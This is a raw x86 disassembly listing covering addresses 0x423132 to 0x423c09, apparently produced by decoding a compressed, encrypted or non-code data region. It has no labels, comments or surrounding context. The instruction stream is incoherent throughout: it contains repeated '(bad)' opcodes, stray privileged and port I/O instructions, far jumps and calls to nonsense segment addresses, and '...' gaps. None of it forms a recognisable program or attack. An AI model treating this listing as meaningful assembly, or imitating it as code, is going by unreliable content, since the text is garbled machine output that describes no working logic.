  423132:	fisubr WORD PTR [ecx-0x57cd5a43]
  423138:	ss or  al,0x8
  42313b:	or     BYTE PTR [ebx+0x24bf9815],dl
  423141:	lds    edi,FWORD PTR [edx+0x29]
  423144:	pop    eax
  423145:	push   ebx
  423146:	xor    bh,cl
  423148:	jge    0x4230e7
  42314a:	mov    esp,0x7630f879
  42314f:	inc    edx
  423150:	arpl   WORD PTR [esi],si
  423152:	ja     0x4231d3
  423154:	iret   
  423155:	pop    ebp
  423156:	clc    
  423157:	lea    ebx,[bp+di-0x3b]
  42315b:	dec    BYTE PTR [eax+ebp*2+0x32]
  42315f:	or     cl,BYTE PTR [ebp-0x4e]
  423162:	fild   WORD PTR [edi]
  423164:	cdq    
  423165:	mov    ds:0x4ce16b3b,al
  42316a:	fidivr WORD PTR [eax+0xce069c0]
  423170:	jns    0x4231e3
  423172:	xchg   esi,eax
  423173:	cmp    esi,ebp
  423175:	enter  0x6dae,0xa2
  423179:	ret    0x31d1
  42317c:	mov    ds:0xe7f8b415,eax
  423181:	or     al,0x81
  423183:	imul   ecx,DWORD PTR [edi],0x23
  423186:	xchg   ecx,eax
  423187:	xchg   BYTE PTR [esi-0x7931a5e4],bh
  42318d:	sbb    ecx,DWORD PTR [eax+0xb228]
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x52979480],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x67000001,al
  42320d:	mov    edi,0xc87c3fdb
  423212:	pop    ds
  423213:	inc    edi
  423214:	or     bl,cl
  423216:	leave  
  423217:	add    edi,DWORD PTR [edi]
  423219:	iret   
  42321a:	in     al,0xd1
  42321c:	pop    esi
  42321d:	cmp    bh,dl
  42321f:	cli    
  423220:	setnp  BYTE PTR [ecx]
  423223:	ss push es
  423225:	mov    al,0x4c
  423227:	add    ebp,DWORD PTR [eax]
  423229:	sub    al,0xa1
  42322b:	mov    eax,0x41779aff
  423230:	xchg   ecx,eax
  423231:	xchg   edi,eax
  423232:	mov    al,BYTE PTR [esi+0x32bec9fc]
  423238:	rcr    BYTE PTR [edi-0x42],cl
  42323b:	inc    esi
  42323c:	inc    esi
  42323d:	sub    BYTE PTR es:[ecx-0x71674a38],ah
  423244:	aad    0x29
  423246:	mov    ds:0x50e8f2e,al
  42324b:	lock or eax,0xf8831610
  423251:	(bad)  
  423253:	inc    esp
  423254:	fisubr DWORD PTR [ecx+0x40ad701b]
  42325a:	sar    DWORD PTR ds:0x935d9c9b,cl
  423260:	jno    0x4231f4
  423262:	out    dx,eax
  423263:	ss pop ss
  423265:	xchg   esi,eax
  423266:	mov    eax,0x5e069867
  42326b:	imul   esi,ebx,0xfffffff3
  42326e:	enter  0xf8d1,0x47
  423272:	(bad)  
  423273:	data16 rcl BYTE PTR [ebx+0x70],1
  423277:	in     eax,0xaf
  423279:	mov    ecx,0xf015a3f0
  42327e:	pushf  
  42327f:	ja     0x42323b
  423281:	push   0xffffff9e
  423283:	xor    dl,BYTE PTR [edi-0x54]
  423286:	imul   ebx,DWORD PTR [eax+0x40d881b9],0xb46c3c00
  423290:	(bad)  
  423291:	dec    DWORD PTR [edx-0xd]
  423294:	mov    bh,0xe5
  423296:	test   DWORD PTR [edx+0x479a5d15],edx
  42329c:	das    
  42329d:	adc    al,0x3c
  42329f:	js     0x42322c
  4232a1:	shl    BYTE PTR [eax+0x260727e8],0xcf
  4232a8:	mov    esp,DWORD PTR [esi]
  4232aa:	push   ds
  4232ab:	push   0xffffff97
  4232ad:	(bad)  
  4232ae:	outs   dx,DWORD PTR ds:[esi]
  4232af:	lock jge 0x42328d
  4232b2:	jbe    0x42327a
  4232b4:	xor    al,0x11
  4232b6:	inc    edx
  4232b7:	sub    ch,BYTE PTR ds:[eax+0xd]
  4232bb:	repnz gs (bad) 
  4232be:	in     eax,dx
  4232bf:	push   ebx
  4232c0:	jg     0x423302
  4232c2:	adc    ebp,esp
  4232c4:	xor    edi,edx
  4232c6:	mov    esi,0xe4bd6cd6
  4232cb:	xor    ch,BYTE PTR [ecx-0x5e]
  4232ce:	inc    ebx
  4232cf:	pop    es
  4232d0:	or     al,0x58
  4232d2:	aam    0x11
  4232d4:	push   edi
  4232d5:	sbb    DWORD PTR ss:[ebp-0x22],edx
  4232d9:	fs pop eax
  4232db:	xchg   esp,eax
  4232dc:	sub    eax,0xc575c2b9
  4232e1:	pop    ebp
  4232e2:	xchg   esi,eax
  4232e3:	or     eax,0xceddc2c6
  4232e8:	stc    
  4232e9:	ret    0x9697
  4232ec:	(bad)  
  4232ed:	pop    edi
  4232ee:	inc    ecx
  4232ef:	mov    ecx,0xa63afd07
  4232f4:	icebp  
  4232f5:	rep outs dx,DWORD PTR ds:[esi]
  4232f7:	pop    edi
  4232f8:	push   ebx
  4232f9:	fdiv   DWORD PTR [edi+0x4e]
  4232fc:	pop    ebx
  4232fd:	shl    BYTE PTR [esi],cl
  4232ff:	das    
  423300:	ja     0x423374
  423302:	shr    ecx,cl
  423304:	and    al,0x73
  423306:	add    ecx,DWORD PTR [edi-0x5a]
  423309:	icebp  
  42330a:	stos   BYTE PTR es:[edi],al
  42330b:	ror    BYTE PTR ds:0xafeed883,cl
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x93e80f44
  423382:	sahf   
  423383:	jns    0x423390
  423385:	js     0x423388
  423387:	add    BYTE PTR ds:0x52000001,al
  42338d:	xor    BYTE PTR [esi+0x50c69f5],dl
  423393:	or     BYTE PTR [esp+ecx*1],dl
  423396:	xor    eax,0xa3645dbb
  42339b:	es push 0x86a50073
  4233a1:	outs   dx,BYTE PTR ds:[esi]
  4233a2:	xchg   esi,eax
  4233a3:	int3   
  4233a4:	fsubr  QWORD PTR [edi+0x18]
  4233a7:	fmul   QWORD PTR [edx-0x7c]
  4233aa:	rep ins BYTE PTR es:[edi],dx
  4233ac:	test   DWORD PTR [esi-0x4e],eax
  4233af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233b0:	fdiv   QWORD PTR [edi-0x1ba66b5c]
  4233b6:	add    DWORD PTR [edx-0x7c961a6],edx
  4233bc:	jbe    0x423434
  4233be:	xchg   ebx,eax
  4233bf:	fnstcw WORD PTR [esi+0x384dd6cc]
  4233c5:	mov    ds:0x2477af77,al
  4233ca:	idiv   DWORD PTR [edi+0x608b37bc]
  4233d0:	test   eax,0x79fa7c7
  4233d5:	sbb    ebp,edx
  4233d7:	call   0xa51a1939
  4233dc:	sbb    eax,0x4d6300c8
  4233e1:	cs pop ecx
  4233e3:	ins    DWORD PTR es:[edi],dx
  4233e4:	or     eax,0xb7ca6c0d
  4233e9:	in     eax,dx
  4233ea:	sbb    ch,BYTE PTR [ebx+edi*2+0x77f81ddb]
  4233f1:	mov    edi,0xf1a76b71
  4233f6:	add    DWORD PTR [edx],ebx
  4233f8:	and    BYTE PTR [edi+0x5d],ah
  4233fb:	call   0xc34db525
  423400:	pop    esp
  423401:	sbb    cl,ah
  423403:	xchg   edi,eax
  423404:	test   BYTE PTR [esi],ch
  423406:	jge    0x4233ec
  423408:	sar    BYTE PTR [ebx],cl
  42340a:	cdq    
  42340b:	retf   0xe649
  42340e:	imul   edx,ecx,0x56941414
  423414:	xor    eax,0xc10ca77c
  423419:	push   ebp
  42341a:	test   BYTE PTR [ebx+edx*4-0x5d],cl
  42341e:	imul   BYTE PTR [esi]
  423420:	mov    esi,0x4038a4f8
  423425:	pop    ss
  423426:	jae    0x42344a
  423428:	ss int 0x9a
  42342b:	popf   
  42342c:	mov    ds:0xd96a51a0,al
  423431:	cs (bad) 
  423433:	loop   0x423438
  423435:	xchg   ebx,eax
  423436:	pop    ebp
  423437:	jg     0x4233cc
  423439:	dec    esp
  42343a:	xor    BYTE PTR ds:0x7a06b2ca,ah
  423440:	imul   ebx,ebp,0x5875498
  423446:	(bad)  
  423447:	and    dh,BYTE PTR [esi]
  423449:	and    al,0x1b
  42344b:	data16 cs jbe 0x423445
  42344f:	ret    
  423450:	jge    0x423448
  423452:	ins    BYTE PTR es:[edi],dx
  423453:	repnz (bad) 
  423455:	cld    
  423456:	jg     0x4234c4
  423458:	mov    ebp,0x75382f7f
  42345d:	mov    eax,ds:0x3282114f
  423462:	popf   
  423463:	retf   
  423464:	test   ebx,edi
  423466:	call   edi
  423468:	mov    dh,BYTE PTR [esi]
  42346a:	pop    esp
  42346b:	dec    edx
  42346c:	test   eax,0xce179825
  423471:	push   ecx
  423472:	pop    ds
  423473:	les    ebp,FWORD PTR [edx-0x24]
  423476:	and    al,0xbb
  423478:	shr    DWORD PTR [esi],1
  42347a:	push   ss
  42347b:	mov    edx,0x36547206
  423480:	add    al,0x97
  423482:	and    eax,0xd9d928b3
  423487:	sbb    DWORD PTR [edi],edx
  423489:	mov    ebx,0xcd0cb5d0
  42348e:	push   0xffffff8e
  423490:	loop   0x423492
	...
  4234f2:	add    BYTE PTR [eax],al
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	or     DWORD PTR [ebx+esi*8],edx
  423503:	loopne 0x423515
  423505:	jns    0x423508
  423507:	add    BYTE PTR ds:0xaf000001,al
  42350d:	jg     0x42354e
  42350f:	sub    DWORD PTR [edi-0x7e],0xffffffde
  423513:	sbb    eax,0x4cd4d433
  423518:	pop    ebx
  423519:	stos   BYTE PTR es:[edi],al
  42351a:	jle    0x4234e2
  42351c:	xchg   DWORD PTR [esi],edi
  42351e:	mov    esi,0xda498162
  423523:	jo     0x4234c0
  423525:	das    
  423526:	push   ds
  423527:	loopne 0x4234bf
  423529:	xchg   cl,dl
  42352b:	xchg   BYTE PTR [eax-0x1c1791b5],ch
  423531:	sub    ecx,DWORD PTR [edi+0x79]
  423534:	popa   
  423535:	mov    bl,0x4d
  423537:	cmp    DWORD PTR cs:[edx+0x561ac2f5],esi
  42353e:	test   ecx,ebx
  423540:	jbe    0x4235bf
  423542:	out    dx,al
  423543:	js     0x4235b1
  423545:	mov    al,ds:0xbd964f7
  42354a:	mov    al,0x24
  42354c:	sub    BYTE PTR [edx],cl
  42354e:	inc    esi
  42354f:	mov    si,ax
  423552:	retf   0xc026
  423555:	push   eax
  423556:	call   0x607:0xa7d7cac
  42355d:	leave  
  42355e:	jbe    0x4235da
  423560:	mov    cl,0xbe
  423562:	add    DWORD PTR [ebx],ebp
  423564:	addr16 pop eax
  423566:	(bad)  
  423568:	call   0xfa15:0x21fa8dce
  42356f:	scas   eax,DWORD PTR es:[edi]
  423570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423571:	rcl    edx,0xab
  423574:	stos   BYTE PTR es:[edi],al
  423575:	adc    ch,BYTE PTR [esi-0x2f]
  423578:	loop   0x42353d
  42357a:	mov    ebp,0x9886c755
  42357f:	and    eax,0x40cbd165
  423584:	cmc    
  423585:	mov    al,ds:0xa990186f
  42358a:	fsub   DWORD PTR [ebp+0x76090495]
  423590:	fwait
  423591:	push   edi
  423592:	(bad)  
  423593:	xor    bl,dl
  423595:	pop    eax
  423596:	test   BYTE PTR [edi+0x49],ah
  423599:	and    bl,bh
  42359b:	sahf   
  42359c:	cld    
  42359d:	ins    BYTE PTR es:[edi],dx
  42359e:	ds retf 0xadb2
  4235a2:	data16 shl BYTE PTR [edx+0x12d82424],1
  4235a9:	and    bh,BYTE PTR ds:0xbdb71aea
  4235af:	ftst   
  4235b1:	test   DWORD PTR [esi+0x2a],0x2d112ca
  4235b8:	inc    edx
  4235b9:	sub    ebx,DWORD PTR [esi-0x10]
  4235bc:	(bad)  
  4235bd:	dec    ebp
  4235be:	ss (bad) 
  4235c0:	jae    0x4235f9
  4235c2:	daa    
  4235c3:	stc    
  4235c4:	or     al,0x6b
  4235c6:	lea    esi,[esi+0x7d]
  4235c9:	aad    0x80
  4235cb:	in     al,dx
  4235cc:	sub    bh,BYTE PTR [esi]
  4235ce:	push   es
  4235cf:	xor    esi,DWORD PTR [ecx]
  4235d1:	sub    al,BYTE PTR [ebp+0xc00fbae]
  4235d7:	xor    ax,WORD PTR [ebp+eax*4-0x5d]
  4235dc:	into   
  4235dd:	push   ss
  4235de:	mov    cl,0x62
  4235e0:	jp     0x423632
  4235e2:	pop    edi
  4235e3:	sub    ebx,ebp
  4235e5:	aas    
  4235e6:	jb     0x42356b
  4235e8:	lods   al,BYTE PTR ds:[esi]
  4235e9:	icebp  
  4235ea:	fbld   TBYTE PTR [ecx+eiz*1+0x35]
  4235ee:	sti    
  4235ef:	dec    edx
  4235f0:	(bad)  
  4235f1:	in     al,dx
  4235f2:	and    eax,DWORD PTR [edi]
  4235f4:	jecxz  0x4235a2
  4235f6:	xchg   ebp,eax
  4235f7:	cmp    BYTE PTR [esi-0x204795c9],dl
  4235fd:	push   0xffffffa2
  4235ff:	mov    ebx,0xefd4f07a
  423604:	cwde   
  423605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423606:	out    dx,eax
  423607:	xchg   ebx,eax
  423608:	sbb    eax,0x6cfd2afd
  42360d:	xchg   edx,eax
  42360e:	dec    esi
  42360f:	push   0xad
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	out    0xad,eax
  423682:	ret    0x15bf
  423685:	jp     0x423688
  423687:	add    BYTE PTR ds:0xea000001,al
  42368d:	push   ds
  42368e:	in     eax,dx
  42368f:	(bad)  
  423690:	fistp  DWORD PTR [ecx+0x44]
  423693:	sbb    al,0x8b
  423695:	ret    
  423696:	or     edx,0xfffffff4
  423699:	adc    BYTE PTR fs:[ebp+0x37de0b],al
  4236a0:	cwde   
  4236a1:	add    al,0x58
  4236a3:	out    0x2f,eax
  4236a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236a6:	mov    dl,0xf
  4236a8:	shl    BYTE PTR [edi],1
  4236aa:	push   edx
  4236ab:	push   0xae805afb
  4236b0:	daa    
  4236b1:	push   cs
  4236b2:	jmp    0x80aa8efb
  4236b7:	inc    edi
  4236b8:	popa   
  4236b9:	shr    DWORD PTR [ebx-0x5e],cl
  4236bc:	sub    ax,0x2c45
  4236c0:	pop    eax
  4236c1:	jmp    FWORD PTR [edx-0x59]
  4236c4:	sbb    al,0x86
  4236c6:	mov    edi,0x3d7df21e
  4236cb:	fmul   DWORD PTR [esi]
  4236cd:	cmc    
  4236ce:	aaa    
  4236cf:	inc    edi
  4236d0:	in     al,dx
  4236d1:	xchg   BYTE PTR [esi+0x42b4b3e4],dh
  4236d7:	adc    al,0xd2
  4236d9:	ins    DWORD PTR es:[edi],dx
  4236da:	(bad)  
  4236db:	jbe    0x4236dd
  4236dd:	pop    edx
  4236de:	add    esi,DWORD PTR [edx+0x1460470c]
  4236e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236e5:	or     dl,cl
  4236e7:	nop
  4236e8:	or     BYTE PTR [eax-0x380ce836],bh
  4236ee:	jns    0x423708
  4236f0:	mov    eax,ds:0xf8de6c8e
  4236f6:	xchg   esi,eax
  4236f7:	test   DWORD PTR ds:0x26cd6f88,edi
  4236fd:	cld    
  4236fe:	dec    eax
  4236ff:	add    DWORD PTR ds:0x9d7d4b46,edi
  423705:	fsub   QWORD PTR [ebp+0xc]
  423708:	ret    0xb15e
  42370b:	int3   
  42370c:	gs ins BYTE PTR es:[edi],dx
  42370e:	sbb    DWORD PTR [esi-0x24],0x6618e39b
  423715:	gs jnp 0x4236ac
  423718:	mov    ch,BYTE PTR [eax-0x457500af]
  42371e:	rol    ch,0x41
  423721:	jg     0x4236ee
  423723:	sbb    BYTE PTR [ebp+eiz*4+0x62],ah
  423727:	sub    al,0x7a
  423729:	or     cl,BYTE PTR [ebp+ebx*4-0x4502e5cf]
  423730:	and    DWORD PTR [ebx-0x6a1ceee3],ecx
  423736:	outs   dx,BYTE PTR ds:[esi]
  423737:	into   
  423738:	xor    ebp,ebx
  42373a:	jnp    0x4236f5
  42373c:	bound  eax,QWORD PTR [edx-0x66]
  42373f:	mov    esi,0x57ff8505
  423744:	push   ds
  423745:	test   al,0x7a
  423747:	call   0xa3e8ef54
  42374c:	dec    ebx
  42374d:	popa   
  42374e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42374f:	pop    es
  423750:	pushw  es
  423752:	mov    eax,ds:0x7c862df1
  423757:	imul   esp,ebp,0x3f
  42375a:	sub    al,0x80
  42375c:	adc    BYTE PTR [ecx+0x4c],bh
  42375f:	lock (bad) 
  423761:	jg     0x4236fb
  423763:	repnz mov dl,0xbd
  423766:	mov    esp,0x7436d42b
  42376b:	fsub   st(5),st
  42376d:	in     al,dx
  42376e:	cmp    al,0xaa
  423770:	rol    BYTE PTR [esi+eiz*2-0x8],0xe7
  423775:	into   
  423776:	ror    DWORD PTR [esi-0x360d71c2],cl
  42377c:	mov    dh,0x68
  42377e:	cmp    bh,BYTE PTR [ebp+0x18]
  423781:	das    
  423782:	sub    edx,DWORD PTR [ebx]
  423784:	fwait
  423785:	aam    0x2
  423787:	and    al,0xf7
  423789:	rcl    BYTE PTR ds:0x7fc33667,cl
  42378f:	call   0x0:0x1e
	...
  4237f2:	add    BYTE PTR [eax],al
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xc8c7bc15
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xd8000001
  42380d:	lahf   
  42380e:	mov    bh,0xfd
  423810:	jae    0x423815
  423812:	rcl    al,0xd
  423815:	lahf   
  423816:	inc    esp
  423817:	inc    edx
  423818:	dec    edi
  423819:	loope  0x423801
  42381b:	sar    DWORD PTR [edx],1
  42381d:	loopne 0x4237ff
  42381f:	std    
  423820:	xchg   DWORD PTR [edi-0x572768a4],ebx
  423826:	das    
  423827:	push   ebx
  423828:	pop    eax
  423829:	push   ecx
  42382a:	push   es
  42382b:	sbb    eax,0x1f7a180f
  423830:	enter  0xf737,0x38
  423834:	push   ds
  423835:	jno    0x423869
  423837:	ins    DWORD PTR es:[edi],dx
  423838:	jo     0x423813
  42383a:	jbe    0x423804
  42383c:	leave  
  42383d:	mov    esi,0x7446a425
  423842:	and    BYTE PTR ds:0xfa2a9e8b,bh
  423848:	mov    eax,ds:0xc7430fe4
  42384d:	xchg   esp,eax
  42384e:	jge    0x42383c
  423850:	les    ebp,FWORD PTR [ebp-0x53]
  423853:	rol    dh,1
  423855:	mov    ebp,0xb6af35d4
  42385a:	jp     0x423823
  42385c:	inc    ebx
  42385d:	xor    al,BYTE PTR [eax-0x7213dda9]
  423863:	mov    al,0x39
  423865:	adc    eax,0x3e973eec
  42386a:	mov    WORD PTR [esi],?
  42386c:	leave  
  42386d:	xlat   BYTE PTR ds:[ebx]
  42386e:	push   esp
  42386f:	aaa    
  423870:	fild   WORD PTR [ecx+0x30dea30a]
  423876:	adc    eax,0xc70ce114
  42387b:	(bad)  
  42387c:	call   0xdb41:0x57cece9d
  423883:	sar    BYTE PTR [ebp-0x2a13548f],0xad
  42388a:	inc    ebx
  42388b:	(bad)  
  42388c:	dec    eax
  42388d:	dec    ebx
  42388e:	jge    0x423875
  423890:	pop    eax
  423891:	pop    esi
  423892:	arpl   WORD PTR [ebx+0x38],bx
  423895:	xor    edx,0xb54523f0
  42389b:	lods   al,BYTE PTR ds:[esi]
  42389c:	mov    al,0xa7
  42389e:	add    al,0xa8
  4238a0:	mov    edx,0x3ac1a6cf
  4238a5:	mov    ds:0x3c85bd7,al
  4238aa:	out    dx,eax
  4238ab:	push   esp
  4238ac:	xchg   esp,eax
  4238ad:	int3   
  4238ae:	pop    edi
  4238af:	mov    fs:0xeba413a1,eax
  4238b5:	push   eax
  4238b6:	enter  0xf7d1,0xf7
  4238ba:	lods   al,BYTE PTR ds:[esi]
  4238bb:	pusha  
  4238bc:	jmp    FWORD PTR [ebx-0x776948b9]
  4238c2:	xchg   eax,eax
  4238c4:	mov    esi,0xc18d1c2d
  4238c9:	jmp    0xbd9d:0x9ca6c22c
  4238d0:	pop    edx
  4238d1:	push   ds
  4238d2:	xchg   ecx,eax
  4238d3:	mov    gs:0xd5435b33,eax
  4238d9:	jmp    0xa611:0x57304059
  4238e0:	and    dh,BYTE PTR [ebp+0x66af0954]
  4238e6:	and    al,0xfe
  4238e8:	push   eax
  4238e9:	test   eax,0x5c37d98e
  4238ee:	mov    ds:0xccfa67b8,al
  4238f3:	int    0x54
  4238f5:	(bad)  
  4238f6:	out    0xf,eax
  4238f8:	sti    
  4238f9:	lds    eax,FWORD PTR [edi]
  4238fb:	jo     0x42393c
  4238fd:	push   esi
  4238fe:	cdq    
  4238ff:	(bad)  
  423900:	push   edx
  423901:	or     edx,DWORD PTR [esi+0x67]
  423904:	ja     0x4238b4
  423906:	dec    ecx
  423907:	dec    edi
  423908:	int3   
  423909:	sub    BYTE PTR [ebx-0x13],ah
  42390c:	aaa    
  42390d:	dec    eax
  42390e:	popa   
  42390f:	mov    dl,0x1f
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xcb2f2bbd
  423982:	(bad)  
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x44000001,al
  42398d:	push   ss
  42398e:	cwde   
  42398f:	jmp    0x4239df
  423991:	ret    0xb850
  423994:	jne    0x423988
  423996:	aaa    
  423997:	push   ecx
  423998:	add    al,0x4f
  42399a:	push   eax
  42399b:	call   0x1cecfaa4
  4239a0:	mov    ah,0xb0
  4239a2:	outs   dx,DWORD PTR ds:[esi]
  4239a3:	std    
  4239a4:	xchg   edi,ecx
  4239a6:	xchg   edx,eax
  4239a7:	sbb    eax,0x6625ab8f
  4239ac:	or     DWORD PTR [eax+0x4a],edx
  4239af:	loopne 0x423a24
  4239b1:	jo     0x4239b9
  4239b3:	xor    eax,0xfc0e024e
  4239b8:	xchg   ebp,eax
  4239b9:	shl    BYTE PTR [esi+0x672ece4c],cl
  4239bf:	adc    BYTE PTR [ecx+0xd717574],0xe9
  4239c6:	and    ebx,DWORD PTR [eax+0x659eab0e]
  4239cc:	je     0x423a4d
  4239ce:	stos   DWORD PTR es:[edi],eax
  4239cf:	hlt    
  4239d0:	sbb    eax,0xb6e5c9c2
  4239d5:	jnp    0x423984
  4239d7:	pop    esp
  4239d8:	mov    bl,0x6d
  4239da:	sti    
  4239db:	ja     0x423a53
  4239dd:	jl     0x4239cf
  4239df:	and    eax,0xcb88b5fd
  4239e4:	jle    0x423a1d
  4239e6:	imul   edx,DWORD PTR [eax+0x31578417],0xffffff82
  4239ed:	dec    esp
  4239ee:	retf   
  4239ef:	mov    BYTE PTR [ecx+eax*1],dh
  4239f2:	dec    ebp
  4239f3:	xchg   esp,eax
  4239f4:	test   BYTE PTR [edx-0x50],bl
  4239f7:	mov    edi,0x3cd38184
  4239fc:	add    ebp,DWORD PTR [edi]
  4239fe:	and    BYTE PTR [ebx-0x78e679e1],bh
  423a04:	pop    ebp
  423a05:	mov    al,ds:0xb8eda2c2
  423a0a:	add    DWORD PTR [esi-0x63a185be],edi
  423a10:	stos   BYTE PTR es:[edi],al
  423a11:	pop    ecx
  423a12:	add    DWORD PTR [edi+0x63],edx
  423a15:	and    BYTE PTR [edx-0x68],ch
  423a18:	cmp    al,0x43
  423a1a:	or     dh,BYTE PTR [ebx+esi*4+0x32]
  423a1e:	test   eax,0x32872e44
  423a23:	mov    ds:0x6c765672,al
  423a28:	adc    eax,DWORD PTR [ebp+0x1]
  423a2b:	inc    ecx
  423a2c:	sbb    eax,0xd23940af
  423a31:	xor    dh,cl
  423a33:	cmp    cl,BYTE PTR [ebx+0x1f]
  423a36:	imul   edx,DWORD PTR [eax-0x1],0x7a
  423a3a:	mov    dl,0x60
  423a3c:	cmp    eax,0x9b212698
  423a41:	cmc    
  423a42:	das    
  423a43:	mov    edx,0x22785b2b
  423a48:	out    0xcb,eax
  423a4a:	stos   DWORD PTR es:[edi],eax
  423a4b:	imul   eax,ebx,0x96630102
  423a51:	lods   al,BYTE PTR ds:[esi]
  423a52:	fsubr  DWORD PTR [ecx-0x7cd16843]
  423a58:	bound  ebp,QWORD PTR [edx-0x6441afc7]
  423a5e:	xor    BYTE PTR [edi+0x6a],bl
  423a61:	out    0x6d,al
  423a63:	outs   dx,DWORD PTR ds:[esi]
  423a64:	hlt    
  423a65:	(bad)  
  423a66:	in     al,0x16
  423a68:	cmp    eax,0xfcf3175e
  423a6d:	inc    ecx
  423a6e:	jmp    0xaa328a3b
  423a73:	cmp    BYTE PTR [eax],0x93
  423a76:	cmp    al,0x20
  423a78:	xor    BYTE PTR [edx+eax*2+0x7d0e6bd1],ah
  423a7f:	cmp    BYTE PTR [eax+0x1e1a3b4c],dl
  423a85:	add    eax,0xbbb6e6b5
  423a8a:	xor    esi,edx
  423a8c:	lods   eax,DWORD PTR ds:[esi]
  423a8d:	or     DWORD PTR [edi],eax
  423a8f:	clc    
  423a90:	push   ebp
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	or     esi,0x7d24380b
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    eax,0xe8000001
  423b0d:	pop    eax
  423b0e:	sub    esi,DWORD PTR [edx-0x1eb23b44]
  423b14:	repnz adc edi,esi
  423b17:	pop    ss
  423b18:	out    dx,al
  423b19:	or     al,0xe0
  423b1b:	mov    bl,0x7f
  423b1d:	mul    BYTE PTR [esi-0x77999cf1]
  423b23:	xchg   ecx,eax
  423b24:	mov    al,ds:0xacb44de5
  423b29:	(bad)  
  423b2a:	fsubr  st(6),st
  423b2c:	cld    
  423b2d:	ror    DWORD PTR [edx+0x3ea33fce],0x76
  423b34:	ficom  WORD PTR [edi]
  423b36:	fnsave [ebp+0xc7ada07]
  423b3c:	mov    edi,0x80266d73
  423b41:	push   ecx
  423b42:	cmp    DWORD PTR [esi+0x50],ebx
  423b45:	retf   
  423b46:	add    ch,BYTE PTR [eax-0x4b]
  423b49:	push   cs
  423b4a:	sub    esi,DWORD PTR [ecx*1+0x7e945e41]
  423b51:	bound  ebp,QWORD PTR [edi-0x20f0d5ab]
  423b57:	inc    ebp
  423b58:	test   eax,0x7a47ec21
  423b5d:	jle    0x423b18
  423b5f:	xchg   ebp,eax
  423b60:	mov    dl,0x98
  423b62:	out    dx,eax
  423b63:	sbb    edx,DWORD PTR [edx+ebp*1+0x2b]
  423b67:	fbld   TBYTE PTR [edi]
  423b69:	ins    BYTE PTR es:[edi],dx
  423b6a:	mov    esp,0xfabec07
  423b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b70:	jl     0x423b50
  423b72:	loopne 0x423b92
  423b74:	ret    
  423b75:	int    0x6c
  423b77:	test   dl,al
  423b79:	mov    cl,0x6a
  423b7b:	mov    ?,edi
  423b7d:	ror    DWORD PTR [esi],0xb8
  423b80:	pop    edx
  423b81:	sbb    bl,bh
  423b83:	xchg   esi,eax
  423b84:	inc    edi
  423b85:	test   BYTE PTR [eax+0x48],bl
  423b88:	fadd   DWORD PTR [ecx-0x23fa1915]
  423b8e:	mov    bh,0xd0
  423b90:	pop    edi
  423b91:	jg     0x423b87
  423b93:	mov    cl,0x68
  423b95:	cmc    
  423b96:	cld    
  423b97:	outs   dx,DWORD PTR ds:[esi]
  423b98:	aas    
  423b99:	leave  
  423b9a:	icebp  
  423b9b:	in     al,dx
  423b9c:	pop    esi
  423b9d:	pop    es
  423b9e:	fwait
  423b9f:	loopne 0x423ba5
  423ba1:	and    BYTE PTR ds:[esi],bh
  423ba4:	icebp  
  423ba5:	xchg   edi,eax
  423ba6:	or     dl,ch
  423ba8:	pop    ds
  423ba9:	enter  0x6d92,0x5c
  423bad:	test   al,0x44
  423baf:	inc    eax
  423bb0:	sub    eax,0x77700dd2
  423bb5:	fs ret 0x1944
  423bb9:	fcmovb st,st(5)
  423bbb:	mov    dh,0x22
  423bbd:	sar    BYTE PTR [ebp+0x69],0xd2
  423bc1:	test   al,0x6b
  423bc3:	jmp    0x423b8c
  423bc5:	inc    edx
  423bc6:	sqrtps xmm2,XMMWORD PTR [edx+esi*4]
  423bca:	leave  
  423bcb:	add    eax,0x670fe57f
  423bd0:	and    esp,DWORD PTR [esi-0x3a]
  423bd3:	mov    ch,BYTE PTR [ebx+0xb]
  423bd6:	push   esp
  423bd7:	push   eax
  423bd8:	imul   eax,DWORD PTR [edi+0x5c],0x4e6ee471
  423bdf:	ins    DWORD PTR es:[edi],dx
  423be0:	into   
  423be1:	aad    0x54
  423be3:	jmp    0x2431:0xfaab3a75
  423bea:	fistp  QWORD PTR [esp+esi*4+0x70f1f187]
  423bf1:	outs   dx,BYTE PTR ds:[esi]
  423bf2:	pop    ebx
  423bf3:	std    
  423bf4:	cwde   
  423bf5:	inc    ebp
  423bf6:	inc    ecx
  423bf7:	mov    ecx,0xccb78fd8
  423bfc:	cmp    BYTE PTR [eax+0x5f],bh
  423bff:	mov    ebp,0xb540c0d8
  423c04:	xor    eax,0xed34b967
  423c09:	mov    dl,0xd9
